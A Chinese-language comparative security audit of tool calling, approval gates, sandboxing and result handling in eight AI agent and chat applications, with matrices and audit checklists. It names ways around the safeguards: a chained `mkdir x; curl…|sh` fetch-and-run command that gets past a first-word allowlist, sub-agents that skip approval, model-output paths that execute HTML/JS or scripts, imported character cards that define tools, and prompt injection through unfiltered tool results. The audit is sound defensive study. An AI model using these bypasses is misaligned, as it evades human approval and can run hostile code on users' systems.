# Agent 工具横向调查与对比

> 对比对象：AIO Hub、Chatbox、Cherry Studio、Hermes、LobeHub、SillyTavern、VCPChat、VCPToolBox
>
> 对比更新日期：2026-08-07
>
> 依据：同目录八份单项目调查笔记及其记录的代码快照
>
> 对比方法：只读源码、类型定义、注册表、执行器、调用入口和单项目调查笔记，逐项核对实现
>
> 对比范围：仅统计**模型能够发现、请求并触发执行**的工具，以及相关审批、执行位置、安全边界与扩展入口。纯 UI 功能、消息渲染器、模型供应商本身能力不计入
>
> 文档定位：实现学习与跨项目横向比较，不作为整改方案

## 单项目笔记

| 项目 | 笔记 | 行数 | 分支 | 代码快照 |
| --- | --- | --- | --- | --- |
| AIO Hub | [AIO-Hub-Agent工具调查笔记.md](AIO-Hub-Agent工具调查笔记.md) | 355 | `main` | `eba9d84b234672321312e92ab48bb474cfb0aca4` |
| Chatbox | [Chatbox-Agent工具调查笔记.md](Chatbox-Agent工具调查笔记.md) | 536 | `main` | `7450ab2dde5eacab4a8721f8680006ba8b99438d` |
| Cherry Studio | [Cherry-Studio-Agent工具调查笔记.md](Cherry-Studio-Agent工具调查笔记.md) | 366 | `main` | `b7673c23860db5dd6da7f42dec5fc21f6b13de1a` |
| Hermes | [Hermes-Agent-Agent工具调查笔记.md](Hermes-Agent-Agent工具调查笔记.md) | 226 | `main` | `01a1037d1e6d7b6eb96a786ef282c3aea4818194` |
| LobeHub | [LobeHub-Agent工具调查笔记.md](LobeHub-Agent工具调查笔记.md) | 590 | `canary` | `4edba1b75a97b91c28ad48cd1cc90528defa17ad` |
| SillyTavern | [SillyTavern-Agent工具调查笔记.md](SillyTavern-Agent工具调查笔记.md) | 418 | `release` | `8172dcd0ee672d3cd9a5e5f7af134f91a45cd2b8` |
| VCPChat | [VCPChat-Agent工具调查笔记.md](VCPChat-Agent工具调查笔记.md) | 299 | `main` | `3f14e938e700a5487ca13c4a6d8a6caad8e70ac9` |
| VCPToolBox | [VCPToolBox-Agent工具调查笔记.md](VCPToolBox-Agent工具调查笔记.md) | 407 | `main` | `eca06251f5687a52fbcd353cb8b04f42157882d0` |

## 调查方法与比较框架

本文以实际执行代码和类型定义为主要依据，结合注册表、配置 schema、测试及仓库架构文档，梳理各项目当前的工具发现、审批、执行和结果回注行为。静态阅读无法确认的内容明确列入“需进一步验证”，不从描述文本推断运行时保证。

统一比较链路如下：

```text
工具发现/注入
  -> 模型调用表示与解析
  -> 调用归一化与策略判定
  -> 审批、拒绝或自动放行
  -> 执行位置（主进程 / 子进程 / 云端 / 设备 / 浏览器）
  -> 结果限制与回注
  -> MCP、Skill 或 Plugin 扩展边界
```

“原生工具调用”指模型 API 的结构化 tool/function 字段；“文本协议”指模型输出仍为文本、由应用从中解析调用块。表示形式本身不决定安全性，关键在于执行端是否重新校验工具可达性、审批状态、参数范围和权限边界。

## 结论摘要

八个项目的差异集中在策略层覆盖率、失效方向、执行位置和可绕过路径；Hermes 是其中唯一的纯 Python 后端聚合核心，执行端与策略层分离、存在一条沙箱 RPC 工具旁路，形态与前七项不同。可按以下五条观察：

1. **策略层完整但默认放行面大：LobeHub。** `humanIntervention` 状态机是七个项目里设计最完整的（四种模式、API 级覆盖 manifest 级、`always` 不可被 auto-run 绕过），但绝大多数内建工具根本不声明该字段，而未声明即默认 `never`（自动执行）。`lobe-creds` 的凭证保存与注入沙箱、`lobe-browser` 八个 API、`lobe-message` 约 30 个 API（含 `deleteBot`）、`lobe-agent-management` 的 `callAgent`/`installPlugin` 均零声明。
2. **策略层有硬边界，但平台与语义有盲点：Chatbox、Cherry Studio。** 两者都实现了逐次审批与总开关，Chatbox 更是八个项目里唯一让总开关有不可绕过类别的实现（`AppActionApprovalPausedError` 与 `agentFullAccess` 在代码层脱钩）。盲点分别在：Chatbox 的 Windows 无 OS 级沙箱、白名单基于 bash 语义；Cherry Studio 的 `acceptEdits` 白名单只看命令首词、路径检查不解析 Bash 命令文本。
3. **当前以 VCP 联动，但三者的架构角色不同：AIO Hub、VCPChat、VCPToolBox。** 三者都参与 VCP 文本协议链路，协议两端的解析语义、审批超时方向和鉴权粒度并不一致。AIO 还需要单独评价：它把模型通信表示抽成了 `ToolCallingProtocol`，工具元数据、审批和执行语义没有写死为 VCP；目前只实现并注册了 VCP，不能据此把其工具系统的设计范围归结为"VCP 客户端"。
4. **无逐次审批，信任边界在安装与内容导入：SillyTavern。** 扩展 action 与宿主同权；`/tools-register` 还允许角色卡、World Info 或 Quick Reply 提供工具定义，因此导入内容也可能改变工具面。
5. **执行端与策略端分离、内置 execute_code 沙箱 RPC 旁路的 Python 后端：Hermes。** 工具集中 registry/`_AGENT_LOOP_TOOLS` 双入口，`resolve_pre_tool_block` 为各分发点唯一审批门（fail-closed），但 `_should_skip_container_guards` 只豁免容器且 `has_host_access=False` 的环境；`execute_code` 沙箱子进程经 `_rpc_server_loop` 回调 `model_tools.handle_function_call`，在父进程线程执行已允许的子工具，给定 allow-list 与 `_last_resolved_tool_names` 一致时，工具侧不重复走编排层审批。结果持久化有 200K/1500 字符双预算，无内容过滤。

## 四个必答问题

判断任一项目前先回答这四问，答案不能从产品宣传或仓库文档取，必须落到实现：

| 项目 | 模型看到什么 | 谁真正执行 | 默认是否需人工 | 已确认的最高风险单点 |
| --- | --- | --- | --- | --- |
| AIO Hub | registry 中 `agentCallable` 方法 + 动态上下文 | Tauri 渲染进程 / Rust 命令 / 远端 VCP 节点 | 可配置，工具级与方法级 | 入向分布式调用无人工审批门；`internal_request_file` 另跳过暴露名单校验 |
| Chatbox | 按会话组装的 AI SDK ToolSet | 主进程 / MCP 子进程 / 沙箱 / 宿主 shell | 高风险命令与越界写入需批准 | Windows 上 `code_execution` 无 OS 隔离，裸执行 |
| Cherry Studio | MCP server tools + Claude Code 声明式注册表 | Electron 主进程 / MCP 子进程 / SDK 原生二进制 | `default` 模式下 Bash 与写入需批准 | `acceptEdits` 白名单只看首词，`mkdir x; curl…\|sh` 可绕过 |
| Hermes | `tools/` 导入注册 + 插件/MCP/Skill 汇入同一 registry，全量注入 | Python 主进程；execute_code 沙箱子进程 | 危险命令需批准（fail-closed），yolo 可跳过 | `execute_code` 沙箱 RPC 旁路直接调 `handle_function_call`，绕过编排层审批链（只受 allow-list 限制） |
| LobeHub | agent mode 的 builtin + connector + MCP | server runtime / cloud gateway / 用户设备 / 本地 MCP | **多数内建工具零声明即自动执行** | MCP HTTP client 无 SSRF 过滤，token 随请求头外泄 |
| SillyTavern | 扩展注册并适配到 provider 的 function tools | 浏览器前端 extension action | 未发现逐次审批 | 扩展 action 与宿主同权，安装即授权 |
| VCPChat | 上游 `tool_calls` / VCP 文本块 / 自带节点工具 | **自带 `VCPDistributedServer` 子进程**、远端 ToolBox | 审批终端，规则可配得任意宽 | 自带节点在本机执行 PowerShellExecutor 等高危插件 |
| VCPToolBox | 插件 manifest 描述 + 上下文占位符 | Node/Python/native 子进程、分布式节点 | 命中规则才审批，超时拒绝 | 审批响应无身份校验，任何持全局 Key 的连接可批准任意请求 |

## 项目实现概览

### AIO Hub

AIO Hub 的工具系统分成三层：`ToolRegistry`/`AgentExtension` 提供能力与动态上下文，发现、审批和执行器处理统一内部对象，`ToolCallingProtocol` 负责模型可见定义、调用解析和结果格式化。当前协议类型和路由只接入 `VcpToolCallingProtocol`，所以实际运行仍是 VCP 文本块；这属于当前实现范围，不是架构边界。稳定定义 `{{tools}}` 与逐轮动态上下文 `{{tool_context}}` 分开注入，执行器在协议解析后还会复核工具、方法和 `agentCallable`。能力来源也不限于内建 registry：动态 factory、JS/Sidecar/Native 插件和远端 VCP proxy 都可汇入同一注册中心。接入 VCP Connector 后，实际权限还取决于远端 ToolBox 或分布式节点；`internal_request_file` 是入向协议义务，不是本机模型可发现的普通工具。

### Chatbox

Chatbox 通过 `buildToolsForSession()` 按 Agent 模式、模型能力、附件、知识库、MCP 和平台动态组装 AI SDK `ToolSet`。stdio MCP 是宿主上的真实子进程，`user_exec` 是真实系统 shell；高风险命令和越界写入可暂停等待批准，应用状态变更与计费类 action 即使开启 `agentFullAccess` 也不能绕过。macOS/Linux 使用 `@anthropic-ai/sandbox-runtime`，Windows 明确没有 OS 级隔离。Skills 是指令与流程文本，不是独立权限沙箱。

### Cherry Studio

Cherry Studio 同时存在通用 `McpRuntimeService` 与 Claude Code Agent 注册表两条工具路径。注册表用 `user`、`internal`、`disabled` 三态控制曝光，并叠加 `disabledTools`、自动批准规则、`canUseTool` 和 hook。审批由 renderer 展示、Electron 主进程持久化并恢复执行；但 Claude Code 的 Bash/Read/Write 最终由 SDK 原生二进制执行，Cherry Studio 处于拦截者而非执行器位置。`acceptEdits` 的首词白名单和不解析 Bash 路径的检查是已确认盲点。

### Hermes

Hermes 是纯 Python 后端聚合核心，工具面由 `tools/` 目录模块导入注册、`plugins/` 目录插件、MCP 客户端动态发现、`skills/`+`optional-skills/` 指令文本四类来源汇入同一 `tools/registry.py` 注册表，经 `get_tool_definitions()` 全量注入每次 API 调用（tools 数组不参与 prompt caching，故工具集刻意保持小而窄）。执行与编排沿 `run_agent.py` → `model_tools.py` → `registry.dispatch` 三层组织，全部在 Python 主进程；`execute_code` 的代码在沙箱子进程，工具调用经 `_rpc_server_loop` 回调父进程线程的 `handle_function_call`。审批是 CLI 交互（fail-closed），`resolve_pre_tool_block` 是各分发点唯一审批门；`HERMES_YOLO_MODE` 或会话 yolo 可跳过审批。agent-level 工具（`todo`/`memory`/`session_search`/`delegate_task`）由 `_AGENT_LOOP_TOOLS` 特判拦截，不进注册表分发。

### LobeHub

LobeHub 将工具可见性、执行位置和人工审批拆成独立链路。builtin、connector 和 MCP 工具可在 server、cloud gateway、用户设备或桌面本地运行；`humanIntervention` 支持多种模式，API 级规则覆盖 manifest 级规则，`always` 不会被 auto-run 绕过。机制完整不等于默认严格：多数内建工具未声明该字段，未声明即 `never` 自动执行，子 Agent 的 `headless` 路径还会跳过人工审批。

### SillyTavern

SillyTavern 的 `ToolManager` 将多家 provider 的 function calling 归一化到浏览器侧 action，按返回顺序串行执行并最多递归五轮。核心没有逐次审批或工具级沙箱，扩展 action 与宿主同权。信任边界也不只在扩展安装：`/tools-register` 允许角色卡、World Info 或 Quick Reply 中的 STscript closure 定义模型工具，使“导入内容”也可能改变工具面。

### VCPChat

VCPChat 既是审批终端，也随包携带并默认启用 `VCPDistributedServer` 子进程，因此整个应用确实会在本机执行 PowerShellExecutor、FileOperator、ScreenPilot 等插件。自动允许规则可以配置得任意宽，审批 WebSocket 只有连接级鉴权；`DESKTOP_PUSH` 还允许模型输出绕过常规审批协议，在桌面画布执行 HTML 与 JavaScript。

### VCPToolBox

VCPToolBox 负责 VCP 文本解析、插件执行、分布式转发和审批状态。插件可通过 Node、Python、native、stdio、direct 或 distributed 路径运行；框架没有统一沙箱，`requiresAdmin` 也不是框架强制点。它的解析器不保护 Markdown code fence，并可用 `fuzzyToolMatching` 放宽语法；审批超时会拒绝，但审批响应没有身份绑定，异步 `/plugin-callback` 也缺少鉴权。

## 横向矩阵

### 工具发现与注入

| 项目 | 发现机制 | 注入形态 | 按会话/模式收窄 |
| --- | --- | --- | --- |
| AIO Hub | 统一 registry 运行期反射 `getMetadata()`，来源可为内建、factory、插件代理或 VCP proxy；筛 `agentCallable === true` | 由 `ToolCallingProtocol` 生成；当前是 system prompt 中的 VCP 定义，`{{tools}}` 与 `{{tool_context}}` 分离 | 单 Agent 的 toggle |
| Chatbox | `buildToolsForSession()` 单一构造点 | 原生 tools 字段 | agentMode、模型能力、附件、知识库、MCP、平台 |
| Cherry Studio | MCP runtime 同步 + 声明式注册表的 `exposure` 三态 | 原生 tools / SDK `query()` 参数 | `scope.mcpToolIds`、环境依赖条件 |
| Hermes | `tools/` 模块导入时 `registry.register()`；插件/MCP/Skill/toolset 四来源汇入同一 registry | 全量 tools 数组随每次 API 调用注入（tools 不进 prompt cache，故工具集保持小而窄） | `enabled_tools`/`enabled_toolsets` 白黑名单、check_fn 30s TTL 探针缓存、`dynamic_schema_overrides` |
| LobeHub | builtin registry + connector + manifest | 原生 tools 字段 | agent/chat mode 白名单、设备在线状态、用户启用 |
| SillyTavern | 扩展调 `registerFunctionTool` | 原生 tools 字段，`tool_choice: "auto"` | `function_calling` 开关、provider/模型支持、`shouldRegister` |
| VCPChat | 消费上游目录；自带节点向服务端 `register_tools` | 上游注入 | 客户端不负责收窄 |
| VCPToolBox | 插件 manifest 扫描 | 描述文本进 system prompt，占位符体系 | 插件启用/禁用 |

值得注意的两处实现差异：AIO Hub 把工具定义与动态上下文分成两个占位符，让前者能进 prompt cache、后者每轮刷新，是八个项目里唯一显式为 cache 命中做的设计；Hermes 反向取舍——tools 数组完全不进 prompt cache，仅 system prompt 前缀被缓存，因此为保住缓存有效性而刻意收窄工具集。Cherry Studio 的 `exposure` 三态（`user`/`internal`/`disabled`）决定工具是给用户看、仅内部调用，还是硬禁用；部分工具（`Task`、agent-teams 的 `SendMessage`/`TeamCreate`）并非 SDK 原生联合类型成员，而是按环境变量条件注入。

### SDK 使用与控制边界

这里比较 SDK 在工具调用链中的实际职责，而非依赖清单。采用 SDK 不会自动带来审批或执行隔离：需要区分 SDK 只负责协议归一化、SDK 自身执行工具，还是项目自行解析并执行。

| 项目 | SDK / 协议位置 | 对工具边界的含义 |
| --- | --- | --- |
| AIO Hub | 自研 `ToolRegistry`、`ToolCallingProtocol` 与 VCP 文本协议 | 工具发现、文本解析和执行前核验均由应用掌握 |
| Chatbox | Vercel AI SDK v6 `ToolSet`，MCP 使用 `@ai-sdk/mcp` | SDK 吸收 Provider tool-call 差异；审批和具体执行仍由应用工具实现承担 |
| Cherry Studio | 普通聊天使用 AI SDK `ToolRegistry`；Claude Code Agent 使用 `@anthropic-ai/claude-agent-sdk` | 前一条路径由应用执行 MCP；后一路径的 Bash/Read/Write 由 SDK 原生二进制执行，应用只能拦截 |
| Hermes | 自研 `tools/registry.py` 注册表 + 自研 transport adapter（OpenAI 兼容 tools / Anthropic / Bedrock / Codex / Codex Responses） | 发现、审批、执行与 RPC 回调全部由 Python 主进程掌握，无第三方 agent SDK；execute_code 沙箱自身提供 `_rpc_server_loop` 工具旁路 |
| LobeHub | 自研 Agent Runtime/builtin registry；MCP client 使用官方 `@modelcontextprotocol/sdk` | 内建工具的策略和执行归 LobeHub；stdio MCP 的进程生命周期由官方 client 启动但无额外沙箱 |
| SillyTavern | 自研 extension action 与多 Provider function-call 适配 | 工具执行在浏览器扩展/服务端 plugin，核心没有 SDK 层的统一审批边界 |
| VCPChat | 自研 VCP 文本协议与分布式节点协议 | 客户端消费上游调用，节点注册和插件执行不经过通用工具 SDK |
| VCPToolBox | 自研文本解析器、plugin manifest 与执行器 | 模型输出到插件执行的协议、审批与分布式转发均由自身实现负责 |

### 模型调用表示与解析

| 项目 | 表示 | 解析边界 |
| --- | --- | --- |
| AIO Hub | 可替换的 `ToolCallingProtocol`；当前唯一实现为 VCP 文本块 | 当前 VCP 解析器用复合正则**跳过** Markdown code fence 与 inline code；执行器在协议外二次核验 `agentCallable` |
| Chatbox | 原生 tool call | provider 差异由 AI SDK 吸收；`toolCallId` 去重 |
| Cherry Studio | 原生 tool call + SDK 消息流 | `mcp__*` 命名与 wire id 映射 |
| Hermes | 原生 tool call（OpenAI 兼容）；Anthropic/Bedrock/Codex adapter 归一 | `_repair_tool_call` 名称近似修复、JSON 解析重试 ≤3 注入 recovery 结果、`coerce_tool_args` 类型洗边缘；`_AGENT_LOOP_TOOLS` 四个 agent 级工具由编排层特判 |
| LobeHub | 原生 tool call | `identifier`/`apiName` 编解码 |
| SillyTavern | 原生 function call，五家格式归一化 | 归一化后按模型返回顺序串行 `await` |
| VCPToolBox | VCP 文本块 | 状态机扫描，带 `fuzzyToolMatching` 开关；**不保护 code fence** |

这里有一处跨项目的实质不一致：**AIO Hub 与 VCPToolBox 跑同一套 VCP 文本协议，但 AIO Hub 的解析器会跳过 Markdown 代码块，VCPToolBox 的状态机不会。** 同一段模型输出——例如在代码块里“演示”一个工具调用——在 AIO Hub 侧被忽略，在 VCPToolBox 侧会被真实解析并执行。VCPToolBox 的 `fuzzyToolMatching` 开关进一步放宽了协议（容忍 `{始}`、`<<[TOOL_REQUEST]>>` 等变体），扩大了误触发面。这既是兼容性问题，也是安全问题。

AIO 的 `ToolCallingProtocol` 定义了工具说明生成、协议说明生成、请求解析和结果格式化四个接口；parser/engine 通过该接口委托协议转换，executor 处理转换后的统一请求。新增协议仍需修改 `SUPPORTED_PROTOCOLS`、`resolveProtocol()` 与 `ToolCallConfig.protocol`，属于代码级扩展点，尚未做到运行期插件注册。工具元数据、审批和执行语义没有写死为 VCP，但该接口输入输出仍是字符串，目前预留的是**多种文本协议**，并未直接覆盖模型 API 的结构化 `tool_calls`。VCPToolBox 的工具协议、插件目录与分布式路由则直接围绕 VCP 组织。

### 编排循环的限制

| 项目 | 步数/迭代上限 | 并发 | 工具超时 | 取消语义 |
| --- | --- | --- | --- | --- |
| AIO Hub | 可配置最大迭代 | 同轮可配串/并行 | 可配置 | 审批 Promise **无超时兜底**，不处理则永久挂起 |
| Chatbox | `maxSteps` 恒为 `MAX_SAFE_INTEGER`，实际限制是应用层 25 次调用阈值 | — | `user_exec` 120s | — |
| Cherry Studio | — | — | MCP 默认 60s，可 per-server | `AbortController` |
| Hermes | `max_iterations` + `iteration_budget` 双上限；预算耗尽强制压缩/退出 | `DaemonThreadPoolExecutor`，`_MAX_TOOL_WORKERS=8`；`_plan_tool_batch_segments` 分"平行安全段+顺序障碍" | 批超时默认 420s（`HERMES_CONCURRENT_TOOL_TIMEOUT_S`） | `ConcurrentToolAuthorizationGate` 开始序门（120s）；超时 `_abandon_batch()` 放行排队 worker；中断逐线程 `_set_interrupt`，中断后不写结果防重复上报 |
| LobeHub | 按 agent 配置；超限设 `forceFinish` 而非硬停（群组编排则直接置 `done`） | `call_tools_batch` 无上限 `Promise.all`；`execSubAgents` 硬编码 15；群组 broadcast 无上限 | 默认 120s，钳制到 [1s, 800s] | client 用 `AbortController` 父子级联；**server 只在步骤边界轮询 `interrupted`，无法中断进行中的 LLM 调用** |
| SillyTavern | 递归上限 5 | 串行 `await` | — | — |
| VCPToolBox | 有迭代上限 | 同轮 `Promise.all` | 有 | 审批超时 5 分钟后拒绝 |

两处实现特征值得记：一是 Chatbox 的 `maxSteps` 名义无限，真实限制是应用层 25 次调用阈值；二是 LobeHub 的并发治理采用两套标准——子 agent 批量硬编码上限 15，普通工具批量与群组 broadcast 都是无上限 `Promise.all`。

### 审批与策略

| 项目 | 默认方向 | 粒度 | 总开关 | 失效时方向 |
| --- | --- | --- | --- | --- |
| AIO Hub | 可配置 | 工具级 + 方法级（方法级优先） | 有 | 审批无超时 → **永久挂起** |
| Chatbox | 高风险需批准 | 命令/路径 | `agentFullAccess`，**有不可绕过类别** | — |
| Cherry Studio | `default` 模式需批准 | 工具名、server id、wildcard | `bypassPermissions` / `acceptEdits` | MCP-source 强制 prompt **优先于** `bypassPermissions` |
| Hermes | 危险命令需批准（CLI 交互，fail-closed） | 命令级（`check_dangerous_command` 危险 pattern）+ 工具级（插件 approve 路由 `rule_key`+reason 哈希） | `HERMES_YOLO_MODE` 冻结 / 会话 yolo | 无交互用户、非网关、无 callback、超时 → **全部拒绝（fail-closed）** |
| LobeHub | **未声明即 `never`（自动执行）** | API 级覆盖 manifest 级 | auto-run 模式，`always` 不可绕过 | connector 权限 DB 异常 → **fail-open**（已核实 scoped 到同用户/workspace，风险有缓解） |
| SillyTavern | 无逐次审批 | — | — | — |
| VCPChat | 命中规则自动允许 | 字符串 contains/exact/regex，无风险分级 | — | 规则可配成 `.*` → 全部自动通过 |
| VCPToolBox | 命中规则才审批 | 工具名 + 参数匹配 | — | 超时/无连接 → **拒绝（fail-closed）** |

同一个策略层在不同项目里的**失效方向相反**：VCPToolBox 审批超时拒绝执行（安全），Hermes 无交互用户、超时、无 callback 也全部拒绝（同为 fail-closed，yolo 是显式降级而非失效），AIO Hub 审批无超时导致挂起（可用性受损但不越权），LobeHub 权限查询失败时放行（越权）。评估任一项目时，“有审批”不是结论，“审批失效时往哪边倒”才是。

Chatbox 的 `AppActionApprovalPausedError` 值得单独点出：它是八个项目里唯一一处"权限总开关有代码层硬边界"的实现——计费与应用状态变更类操作与 `agentFullAccess` 完全脱钩，用户即使开了完全放行也绕不过。其余项目的总开关一旦打开即全面放行。

### 执行位置与隔离

| 项目 | 执行域 | 隔离手段 | 平台差异 |
| --- | --- | --- | --- |
| AIO Hub | Tauri 渲染进程、Rust 命令、远端 VCP 节点 | 路径沙箱**仅前端字符串判断**，Rust 侧与 Tauri capability 无限制（`fs:allow-*` 均为 `{"path":"**"}`） | 未见分支 |
| Chatbox | 主进程、MCP 子进程、SRT 沙箱、宿主 shell | macOS/Linux 用 `@anthropic-ai/sandbox-runtime` | **Windows 无 OS 级沙箱**，代码注释自述 "no OS isolation" |
| Cherry Studio | Electron 主进程、MCP 子进程、SDK 原生二进制 | `disallowedTools` + `canUseTool` + `PreToolUse` hook 三层；**不持有执行本身** | — |
| Hermes | Python 主进程（全部工具）；execute_code 的代码在沙箱子进程（本机=临时目录+子进程，容器/远程=环境容器） | Docker/Modal/Daytona/Singularity/Vercel Sandbox 容器资源上限；本机 `local` backend 无沙箱强制；terminal 子调用剥离 `background/pty/notify_on_complete/watch_patterns` | 容器且 `has_host_access=False` 时跳过危险命令审批，本地无此豁免 |
| LobeHub | server runtime、cloud gateway、用户设备、本地 MCP | 云沙箱隔离；`local-system` 走 pathScopeAudit + 通用黑名单 | 桌面端 `executors: ['client']` 就地执行 |
| SillyTavern | 浏览器前端、服务端 plugin | 无工具级隔离 | — |
| VCPChat | **自带 `VCPDistributedServer` 子进程**、远端 ToolBox | 自带节点对自己的插件也不做隔离 | — |
| VCPToolBox | Node/Python/native 子进程、分布式节点 | 无框架级沙箱；`LinuxShellExecutor` 自带八层校验与可选 bubblewrap/firejail/docker，`PowerShellExecutor` 只有关键字黑名单 | 两个 shell 插件风险等级不对等 |

Cherry Studio 这一行的"不持有执行本身"是理解它的关键：Claude Code 的 Bash/Read/Write 由 SDK 自带原生二进制执行，Cherry 只能通过禁用列表、`canUseTool` 回调和 hook 去拦，无法在执行点上加沙箱。这与 Chatbox 自己起沙箱进程、LobeHub 自己控制云沙箱是不同的权力位置。

AIO Hub 的路径沙箱需要特别标注：`security.ts` 的字符串 `startsWith` 校验只在 `args.path` 单字段生效，Rust 侧 `read_text_file_force` / `write_text_file_force` 不做任何路径限制。也就是说唯一边界是那段 TypeScript，且 `directory-tree`、`dir-search`、`ffmpeg-tools` 等不复用它的工具等于没有沙箱。

### 结果回注

| 项目 | 截断 | 标记 | 输出侧过滤 |
| --- | --- | --- | --- |
| AIO Hub | 有迭代与超时限制 | — | 无 |
| Chatbox | stdout/stderr 各 1 MB | — | 无 |
| Cherry Studio | 有 | — | 无 |
| Hermes | per-tool 上限（默认 100K）+ per-turn 聚合预算（200K）+ preview 1.5K，三层持久化落盘回填 | `<persisted-output>` 标记 + 文件引用 | 无 |
| LobeHub | 默认 25000 字符，可按 agent 覆盖 | 追加明确的截断字符数提示，全文归档到 VFS 并告知取回路径 | 无 |
| SillyTavern | — | — | 无 |
| VCPToolBox | 有 | — | 无 |

**八个项目全都没有工具结果的输出侧内容过滤或隔离标记。** 截断只解决"过长"，不解决"内容是否可信"。任一项目里"模型读到外部内容 → 该内容伪装成指令 → 诱导调用高危工具"这条链都成立，差别只在末端工具是否需要审批。Hermes 的三层持久化（落盘 preview + 文件引用）只控制上下文膨胀，与其余项目同面无输出侧过滤。LobeHub 的实现是唯一在结果回注上做了反幻觉设计的：截断提示会写明省略了多少字符、原文多长，归档提示明确告诉模型去哪取回、并显式警告不要改用 `cloud-sandbox` 或 `local-system` 文件工具去找，归档失败也诚实告知未持久化。

## 基础审计框架

### 1. 工具目录、执行器和审批状态是否分离

分别检查模型可见的工具定义、运行时可执行的方法和当前获准的调用。三者合并在同一个扩展 action 或动态对象上时，安装信任通常会取代细粒度权限控制；三者分离时，还要确认执行器不会只凭名称调用未暴露的方法。

### 2. 执行端是否重新验证审批

确认禁用和强制审批在真正执行前再次检查，拒绝、超时与取消产生确定结果，同一调用不能被重复提交。审批 UI 只负责收集决定，不能成为唯一强制点；跨进程或分布式调用还要绑定请求身份与发起者。

### 3. MCP、Skill 和 Plugin 的权限模型是否被区分

MCP 通常连接本机进程或远端服务，Skill 通常是模型可读的指令或流程文本，Plugin 往往是与宿主同权的可执行代码。格式校验、安装警告和 manifest 声明不能替代执行时的权限检查。

### 4. 平台和部署路径是否改变工具边界

同一工具在 Windows、macOS、Linux、云端、桌面端和用户设备上可能走完全不同的执行器与隔离层。审批规则应同时描述能力、目标位置、文件或网络范围及平台，不能只按工具名授权。

### 5. 结果回注是否受限

检查超时、大小截断、流式中断、拒绝结果和恶意输出。输出大小限制只能控制上下文膨胀，不能阻止工具结果中的 prompt 注入；还需区分可信系统状态与不可信工具内容。

## 深入审计项

基础五条用于建立结构边界，下面八条用于进一步区分实现质量；每条都至少在一个项目上已确认命中。

### 1. 子 Agent 是否构成审批绕过路径

**LobeHub 已确认命中。** `callSubAgent` 派出的子 agent 以 `approvalMode: 'headless'` 运行，即跳过人工审批门；而 `callSubAgent` 本身 `humanIntervention` 未声明，默认自动执行。父 agent 只要能派子 agent，就等于获得一条绕开审批的执行路径。嵌套虽有三层阻断（manifest 过滤、执行体自检、runtime 兜底），但三层都依赖同一个 `isSubAgent` 布尔位。

Cherry Studio 的同类问题尚未验证（子 agent 是否共享父会话权限策略快照，依赖 SDK 内部实现）。Hermes 的 `delegate_tool` 默认 `_subagent_auto_deny`，`delegation.subagent_auto_approve: true` 时才改用 `_subagent_auto_approve`；子代理是否在 `dispatch` 执行阶段逐次复验 `enabled_tools` 尚未验证（见未验证项）。检查任何支持 agent-as-tool 的实现时，这应是第一个问题。

### 2. 协议两端的解析语义是否一致

**AIO Hub 与 VCPToolBox 已确认不一致**（code fence 保护，见上文）。凡是同一文本协议由多个独立实现解析的架构，都要逐边界比对：code fence、inline code、嵌套、参数含分隔符、流式截断、畸形块、同轮多块、大小写与空白容忍。任一端更宽松，整个系统的有效边界就是最宽松那一端。

### 3. 策略层失效时的方向

已确认三种不同方向：VCPToolBox fail-closed、LobeHub connector 权限查询 fail-open、AIO Hub 审批无超时导致永久挂起。要分别测：审批终端离线、审批超时、权限存储不可用、网关不可达。

### 4. 审批链路是否有消息级鉴权

**VCPChat 与 VCPToolBox 两端都已确认只有连接级鉴权。** ToolBox 侧把审批请求广播给所有已认证 `VCPLog` 客户端，任何持同一全局 `VCP_Key` 的连接都能批准或拒绝任意请求（requestId 随广播暴露）；VCPChat 侧只在建连时做一次性 Key 握手，之后同一条 WebSocket 上收到的任何 `tool_approval_request` 都被无条件信任并可被自动规则批准。审批身份没有绑定发起者，也没有区分"谁有权批准"。

### 5. 是否存在绕开自身审批协议的旁路能力

已确认三条真正由**模型输出**触发的旁路：VCPChat 的 `DESKTOP_PUSH`（模型输出特定标记即在 renderer 侧被拦截并在桌面画布执行 HTML+JS，无审批无白名单）、AIO Hub 的 `data-filter` `customScript`（直接进 `new Function()`，在渲染进程主上下文执行、可间接触达 `window.__TAURI_INTERNALS__`）、Hermes 的 `execute_code` 沙箱 RPC（沙箱内代码经 `_rpc_server_loop` 在父进程线程回调 `handle_function_call`，给定 allow-list 后执行已允许工具，不重复走编排层审批门；allow-list 与主会话工具面一致）。VCPToolBox 的 `/plugin-callback/:pluginName/:taskId` 是另一类：无鉴权的外部 HTTP 入口，可伪造异步任务结果注入下一轮上下文，触发方是网络对端而非模型。

审计时不要只看工具目录和审批配置，要搜"模型输出能触发的所有代码路径"——但也要反向区分：**入向协议义务不等于模型可用的旁路**，详见审计项 ⑧。

### 6. 工具目录是否有命名冲突检测

**Chatbox 已确认命中。** 知识库工具集与文件系统工具集都注册 `list_files`，合并顺序让后者静默覆盖前者，模型实际无法调用"列知识库文件"。这是功能 bug 而非安全问题，但暴露了动态组装 ToolSet 缺少冲突检测——同样的缺失若发生在权限不同的两个同名工具上就是安全问题。VCPToolBox 的分布式 `register_tools` 会跳过同名工具（防覆盖），但不防"注册一个诱导性命名的新工具"（如 `FileOperator2`）来钓鱼。

### 7. 工具定义能否由内容而非代码提供

**SillyTavern 已确认命中。** `/tools-register` 可以把一段 STscript closure 注册为模型可调用的工具，而对 action closure 的来源没有任何限制。如果这条命令来自角色卡首条消息、World Info 词条正文，或由 `automationId` 触发的 Quick Reply，那么**内容发布者就能在受害者不知情的情况下为该角色永久定义任意工具**，其 action 可以是任意 STscript（`/genraw` 发起隐藏生成、`/inject` 篡改后续 prompt、读写全局变量）。

这类风险与"安装了不可信扩展"不同：受害者只是导入了一张角色卡或一个世界书，通常不会被视为安装软件。审计任何支持"数据即脚本"的实现时，都要问：工具定义的来源是否被限制为代码，还是用户内容也能定义工具。

**模型自己输出的文本不会被当作 slash command 执行。** `processCommands` 只解析用户主动发送的以 `/` 开头的消息。因此 SillyTavern 的注入放大路径是“内容定义工具”，不是“模型输出直接执行命令”。

### 8. 区分"协议义务"与"模型可达的工具"

一个能力出现在某处工具清单里，不等于本端模型能发现和调用它。**AIO Hub 的 `internal_request_file` 是这条审计项的正例**：它只声明在 `BUILTIN_VCP_TOOLS`（AIO 作为分布式节点注册时上报的 manifest）中，不进 `toolRegistryManager`，因此 AIO 内的模型既看不到也调不动它；VCPToolBox 侧收到 `register_tools` 后又把它从 `externalTools` 里显式过滤掉，远端模型的工具列表里同样没有它。它纯粹是为满足 VCP 分布式契约而实现的**入向**协议义务。

